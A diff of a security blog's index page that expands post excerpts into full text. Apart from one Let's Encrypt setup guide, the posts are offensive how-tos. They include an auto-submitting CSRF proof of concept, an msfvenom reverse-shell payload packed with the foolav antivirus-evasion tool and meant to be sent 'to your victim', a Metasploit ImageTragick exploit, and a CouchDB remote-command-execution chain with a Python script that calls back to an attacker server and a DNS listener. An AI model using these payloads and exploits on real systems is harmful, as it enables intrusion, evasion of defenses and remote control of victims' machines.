@@ -353,15 +353,10 @@
       
         
           
-          Install in Ubuntu1412345678910111213141516&gt; sudo apt-get update&gt; sudo apt-get install git&gt; sudo easy_install --upgrade pip&gt; sudo apt-get i
-          ...
-          <!--noindex-->
-          <div class="post-more-link text-center">
-            <a class="btn" href="/2016/06/01/Automatic-deployment-Let-s-Encrypt-Certificate/#more" rel="contents">
-              Read more &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
+            <h3 id="Install-in-Ubuntu14"><a href="#Install-in-Ubuntu14" class="headerlink" title="Install in Ubuntu14"></a>Install in Ubuntu14</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&gt; sudo apt-get update</span><br><span class="line">&gt; sudo apt-get install git</span><br><span class="line">&gt; sudo easy_install --upgrade pip</span><br><span class="line">&gt; sudo apt-get install python-dev</span><br><span class="line">&gt; sudo apt-get install dialog</span><br><span class="line">&gt; sudo pip install libffi-dev</span><br><span class="line">&gt; sudo pip install cryptography</span><br><span class="line">&gt; sudo pip install zope.component</span><br><span class="line">&gt; sudo pip install pyrfc3339</span><br><span class="line">&gt; sudo pip install werkzeug</span><br><span class="line">&gt; sudo pip install --upgrade requests</span><br><span class="line">&gt; sudo pip install letsencrypt</span><br><span class="line">&gt; sudo pip install letsencrypt-nginx</span><br><span class="line">&gt; sudo apt-get install letsencrypt</span><br><span class="line">&gt; sudo git clone https://github.com/letsencrypt/letsencrypt /opt/letsencrypt</span><br><span class="line">&gt; ./letsencrypt-auto --apache -d www.example.com</span><br></pre></td></tr></table></figure>
+<h3 id="Add-to-Crontab"><a href="#Add-to-Crontab" class="headerlink" title="Add to Crontab"></a>Add to Crontab</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; sudo crontab -e</span><br><span class="line">30 2 * * 1 /opt/letsencrypt/letsencrypt-auto renew &gt;&gt; /var/log/le-renew.log</span><br></pre></td></tr></table></figure>
+<h4 id="From"><a href="#From" class="headerlink" title="From"></a>From</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://certbot.eff.org/</span><br><span class="line">https://www.digitalocean.com/community/tutorials/how-to-set-up-apache-virtual-hosts-on-ubuntu-14-04-lts</span><br></pre></td></tr></table></figure>
+          
         
       
     </div>
@@ -619,18 +614,12 @@
       
         
           
-          CSRF POC
-请求两次CSRF达到最终效果，POST–&gt;first.php–&gt;second.php
+            <h3 id="CSRF-POC"><a href="#CSRF-POC" class="headerlink" title="CSRF POC"></a>CSRF POC</h3><blockquote>
+<p>请求两次CSRF达到最终效果，POST–&gt;first.php–&gt;second.php</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;form id=&quot;form1&quot; target=&apos;csrfIframe1&apos; action=&quot;http://blog.safebuff.com/first.php&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;name&quot; value=&quot;小乐天&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;form id=&quot;form2&quot; target=&apos;csrfIframe2&apos; action=&quot;http://blog.safebuff.com/second.php&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;password&quot; value=&quot;sec&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    window.onload = function() &#123;</span><br><span class="line">        document.getElementById(&quot;form1&quot;).submit();</span><br><span class="line"> 	    document.getElementById(&quot;form2&quot;).submit();</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;iframe style=&quot;display: hidden&quot; height=&quot;0&quot; width=&quot;0&quot; frameborder=&quot;0&quot; name=&quot;csrfIframe1&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;iframe style=&quot;display: hidden&quot; height=&quot;0&quot; width=&quot;0&quot; frameborder=&quot;0&quot; name=&quot;csrfIframe2&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
 
-123456789101112131415161718192021&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot
-          ...
-          <!--noindex-->
-          <div class="post-more-link text-center">
-            <a class="btn" href="/2016/05/31/Multi-CSRF-POC/#more" rel="contents">
-              Read more &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
+          
         
       
     </div>
@@ -1159,16 +1148,11 @@
       
         
           
-          Downloadfoolav
-Start msfvenom1&gt;msfvenom -p windows/meterpreter_reverse_tcp LHOST=192.168.1.10 LPORT=8080 -a x86 -f c 2&gt;/dev/null | egrep &quot;^
-          ...
-          <!--noindex-->
-          <div class="post-more-link text-center">
-            <a class="btn" href="/2016/05/26/Bypass-Antivirus-via-foolav/#more" rel="contents">
-              Read more &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
+            <h4 id="Download"><a href="#Download" class="headerlink" title="Download"></a>Download</h4><p><a href="https://github.com/hvqzao/foolav/releases/download/v1.0/foolav.zip" target="_blank" rel="external">foolav</a></p>
+<h4 id="Start-msfvenom"><a href="#Start-msfvenom" class="headerlink" title="Start msfvenom"></a>Start msfvenom</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;msfvenom -p windows/meterpreter_reverse_tcp LHOST=192.168.1.10 LPORT=8080 -a x86 -f c 2&gt;/dev/null | egrep &quot;^\&quot;&quot; | tr -d &quot;\&quot;\n;&quot; &gt; foolav.mf</span><br></pre></td></tr></table></figure>
+<h4 id="cp-foolav-mf-to-foolav-directory"><a href="#cp-foolav-mf-to-foolav-directory" class="headerlink" title="cp foolav.mf to foolav directory"></a>cp foolav.mf to foolav directory</h4><h4 id="Start-msf-cosole"><a href="#Start-msf-cosole" class="headerlink" title="Start msf cosole"></a>Start msf cosole</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt; msfconsole</span><br><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">msf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(handler) &gt; set LHOST 192.168.1.10</span><br><span class="line">LHOST =&gt; 192.168.1.10</span><br><span class="line">msf exploit(handler) &gt; set LPORT 8080</span><br><span class="line">LPORT =&gt; 8080</span><br><span class="line">msf exploit(handler) &gt; exploit -j</span><br></pre></td></tr></table></figure>
+<h4 id="send-foolav-foler-to-your-victim"><a href="#send-foolav-foler-to-your-victim" class="headerlink" title="send foolav foler to your victim :)"></a>send foolav foler to your victim :)</h4><h4 id="windows-victim-run-foolav-exe"><a href="#windows-victim-run-foolav-exe" class="headerlink" title="windows victim run foolav.exe :)"></a>windows victim run foolav.exe :)</h4>
+          
         
       
     </div>
@@ -1429,18 +1413,14 @@ Start msfvenom1&gt;msfvenom -p windows/meterpreter_reverse_tcp LHOST=192.168.1.1
       
         
           
-          BurpSuite
-Download burp-image-size.jar
-BurpSuite &gt;&gt; Extender &gt;&gt; Extensions &gt;&gt; Add &gt;&gt; select burp-image-size.jar
-using burpsuit
-          ...
-          <!--noindex-->
-          <div class="post-more-link text-center">
-            <a class="btn" href="/2016/05/26/ImageTragick-using-BurpSuite-and-Metasploit/#more" rel="contents">
-              Read more &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
+            <h3 id="BurpSuite"><a href="#BurpSuite" class="headerlink" title="BurpSuite"></a>BurpSuite</h3><ol>
+<li>Download <a href="https://github.com/silentsignal/burp-image-size/releases" target="_blank" rel="external">burp-image-size.jar</a></li>
+<li>BurpSuite &gt;&gt; Extender &gt;&gt; Extensions &gt;&gt; Add &gt;&gt; select burp-image-size.jar</li>
+<li>using burpsuite to scan upload point</li>
+</ol>
+<h3 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt; msfconsole</span><br><span class="line">msf&gt; use exploit/unix/fileformat/imagemagick_delegate</span><br><span class="line">msf&gt; set LPORT 8080</span><br><span class="line">msf&gt; exploit -j</span><br><span class="line">msf exploit(imagemagick_delegate) &gt; exploit -j</span><br><span class="line">[*] Exploit running as background job.</span><br><span class="line">[*] Started reverse TCP handler on 10.0.5.41:8080</span><br><span class="line">msf exploit(imagemagick_delegate) &gt; [+] msf.png stored at /Users/xl7dev/.msf4/local/msf.png</span><br><span class="line">msf exploit(imagemagick_delegate) &gt; session -i 1</span><br></pre></td></tr></table></figure>
+
+          
         
       
     </div>
@@ -1566,16 +1546,22 @@ using burpsuit
       
         
           
-          NMAP:1&gt; nmap -Pn -n -v -sV -p 5984 [ip]
-POC:1234curl -X PUT &apos;http://1.1.1.1:5984/_config/query_servers/cmd&apos; -d &apos;&quot;/sbin/ifconfig
-          ...
-          <!--noindex-->
-          <div class="post-more-link text-center">
-            <a class="btn" href="/2016/05/20/CouchDB-unauthorized-access/#more" rel="contents">
-              Read more &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
+            <p>NMAP:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; nmap -Pn -n -v -sV -p 5984 [ip]</span><br></pre></td></tr></table></figure></p>
+<p>POC:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl -X PUT &apos;http://1.1.1.1:5984/_config/query_servers/cmd&apos; -d &apos;&quot;/sbin/ifconfig &gt;/tmp/6666&quot;&apos;</span><br><span class="line">curl -X PUT &apos;http://1.1.1.1:5984/vultest&apos;</span><br><span class="line">curl -X PUT &apos;http://1.1.1.1:5984/vultest/vul&apos; -d &apos;&#123;&quot;_id&quot;:&quot;770895a97726d5ca6d70a22173005c7b&quot;&#125;&apos;</span><br><span class="line">curl -X POST &apos;http://1.1.1.1:5984/vultest/_temp_view?limit=11&apos; -d &apos;&#123;&quot;language&quot;:&quot;cmd&quot;,&quot;map&quot;:&quot;&quot;&#125;&apos; -H &apos;Content-Type: application/json&apos;</span><br></pre></td></tr></table></figure></p>
+<blockquote>
+<p>cat /tmp/6666</p>
+</blockquote>
+<p>利用dns记录回显:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">import urllib2 </span><br><span class="line">import random </span><br><span class="line">def random_str(len): </span><br><span class="line">    str1=&quot;&quot; </span><br><span class="line">    for i in range(len): </span><br><span class="line">        str1+=(random.choice(&quot;ABCDEFGH1234567890&quot;)) </span><br><span class="line">    return str(str1) </span><br><span class="line">def check(url): </span><br><span class="line">    rand_str = random_str(8) </span><br><span class="line">    cmd = random_str(4) </span><br><span class="line">    req_list = [ </span><br><span class="line">        [&quot;/_config/query_servers/%s&quot;%(cmd),&apos;&quot;nslookup %s [vps ip]&gt;log&quot;&apos;%(rand_str)], </span><br><span class="line">        [&quot;/vultest123&quot;,&apos;&apos;], </span><br><span class="line">        [&quot;/vultest123/test&quot;,&apos;&#123;&quot;_id&quot;:&quot;safetest&quot;&#125;&apos;] </span><br><span class="line">    ] </span><br><span class="line">    for req_info in req_list: </span><br><span class="line">        try: </span><br><span class="line">            request = urllib2.Request(url+req_info[0],req_info[1]) </span><br><span class="line">            request.get_method = lambda: &apos;PUT&apos; </span><br><span class="line">            urllib2.urlopen(request) </span><br><span class="line">        except: </span><br><span class="line">            pass </span><br><span class="line">    try: </span><br><span class="line">        req_exec = urllib2.Request(url + &quot;/vultest123/_temp_view?limit=11&quot;,&apos;&#123;&quot;language&quot;:&quot;%s&quot;,&quot;map&quot;:&quot;&quot;&#125;&apos;%(cmd)) </span><br><span class="line">        req_exec.add_header(&quot;Content-Type&quot;,&quot;application/json&quot;) </span><br><span class="line">        urllib2.urlopen(req_exec) </span><br><span class="line">    except: </span><br><span class="line">        pass </span><br><span class="line">    check = urllib2.urlopen(&quot;http://[vps ip]/%s&quot;%(rand_str)).read() </span><br><span class="line">    if &apos;YES&apos; in check: </span><br><span class="line">        return url,&apos;YES&apos; </span><br><span class="line">    else: </span><br><span class="line">        return False </span><br><span class="line">if __name__ == &apos;__main__&apos;: </span><br><span class="line">    print check(&quot;http://www.target.com/&quot;)</span><br></pre></td></tr></table></figure></p>
+<p>DNS log<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">import socket,thread,datetime </span><br><span class="line">query_history = [] </span><br><span class="line">url_history = [] </span><br><span class="line">def web_server(): </span><br><span class="line">    web = socket.socket(socket.AF_INET,socket.SOCK_STREAM) </span><br><span class="line">    web.bind((&apos;0.0.0.0&apos;,80)) </span><br><span class="line">    web.listen(10) </span><br><span class="line">    while True: </span><br><span class="line">        try: </span><br><span class="line">            conn,addr = web.accept() </span><br><span class="line">            data = conn.recv(4096) </span><br><span class="line">            req_line = data.split(&quot;\r\n&quot;)[0] </span><br><span class="line">            path = req_line.split()[1] </span><br><span class="line">            route_list = path.split(&apos;/&apos;) </span><br><span class="line">            html = &quot;NO&quot; </span><br><span class="line">            if len(route_list) == 3: </span><br><span class="line">                if route_list[1] == &apos;add&apos;: </span><br><span class="line">                    url_history.append(route_list[2]) </span><br><span class="line">                elif route_list[1] == &apos;check&apos;: </span><br><span class="line">                    if route_list[2] in url_history: </span><br><span class="line">                        html = &apos;YES&apos; </span><br><span class="line">            else: </span><br><span class="line">                query_str = route_list[1] </span><br><span class="line">                for query_raw in query_history: </span><br><span class="line">                    if query_str in query_raw:html = &quot;YES&quot; </span><br><span class="line">            print datetime.datetime.now().strftime(&apos;%m-%d %H:%M:%S&apos;) + &apos; web query: &apos; + path </span><br><span class="line">            raw = &quot;HTTP/1.0 200 OK\r\nContent-Type: application/json; charset=utf-8\r\nContent-Length: %d\r\nConnection: close\r\n\r\n%s&quot; %(len(html),html) </span><br><span class="line">            conn.send(raw) </span><br><span class="line">            conn.close() </span><br><span class="line">        except: </span><br><span class="line">            pass </span><br><span class="line">if __name__==&quot;__main__&quot;: </span><br><span class="line">    dns = socket.socket(socket.AF_INET,socket.SOCK_DGRAM) </span><br><span class="line">    dns.bind((&apos;0.0.0.0&apos;,53)) </span><br><span class="line">    thread.start_new_thread(web_server,()) </span><br><span class="line">    while True: </span><br><span class="line">        recv,addr = dns.recvfrom(1024) </span><br><span class="line">        query_history.append(recv) </span><br><span class="line">        print datetime.datetime.now().strftime(&apos;%m-%d %H:%M:%S&apos;) + &apos; Dns Query: &apos; + recv</span><br></pre></td></tr></table></figure></p>
+<p>CouchDB user brute</p>
+<blockquote>
+<p>msfconsole</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msf&gt; use auxiliary/scanner/couchdb/couchdb_login</span><br><span class="line">msf&gt; set PASS_FILE /opt/metasploit-framework/embedded/framework/data/wordlists/http_default_pass.txt</span><br><span class="line">msf&gt; set USER_FILE /opt/metasploit-framework/embedded/framework/data/wordlists/http_default_users.txt</span><br><span class="line">msf&gt; set RPORT 5984     #couchdb default port 5984</span><br><span class="line">msf&gt; set VHOST http://www.target.com</span><br><span class="line">msf&gt; set RHOST 10.10.0.10</span><br><span class="line">msf&gt; run</span><br></pre></td></tr></table></figure>
+<h3 id="应急分析："><a href="#应急分析：" class="headerlink" title="应急分析："></a>应急分析：</h3><p>couchdb default log<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; /var/log/couchdb/couchdb.log</span><br></pre></td></tr></table></figure></p>
+<p>参考:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://drops.wooyun.org/papers/16030</span><br><span class="line">http://zone.wooyun.org/content/27355</span><br></pre></td></tr></table></figure></p>
+
+          
         
       
     </div>
